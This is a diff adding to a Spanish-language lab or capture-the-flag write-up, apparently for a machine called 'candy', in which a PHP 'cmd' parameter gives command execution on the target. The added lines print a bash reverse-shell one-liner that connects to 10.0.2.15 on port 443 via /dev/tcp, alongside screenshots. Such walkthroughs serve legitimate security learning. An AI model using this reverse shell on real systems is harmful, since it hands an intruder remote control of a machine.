@@ -55,6 +55,17 @@ if(isset($_GET['cmd']))
 
 Le damos a guardar y probamos inyectar un "id" en la url, nos devuelve el usuario por defecto de la máquina víctima, ¡en este punto logramos ejecutar comandos a nivel de sistema!
 
+<img width="829" height="316" alt="candy11" src="https://github.com/user-attachments/assets/ac408379-28ff-40b7-a6a5-abea600f4d2a" />
+
+Desde nuestra terminal, nos ponemos en escucha con netcat por el puerto 443 y nos lanzamos el típico oneliner de reverse shell,de la siguiente manera:
+
+```bash
+bash -c 'bash -i >%26 /dev/tcp/10.0.2.15/443 0>%261'
+```
+
+<img width="829" height="316" alt="candy12" src="https://github.com/user-attachments/assets/4963b87e-3712-4355-8ee6-f151c4b684c6" />
+
+<img width="1019" height="316" alt="candy13" src="https://github.com/user-attachments/assets/a9a7760b-82ad-4f17-8ac5-6ab2b4bc31f7" />
 
 
 ## 🔑 ESCALADA DE PRIVILEGIOS
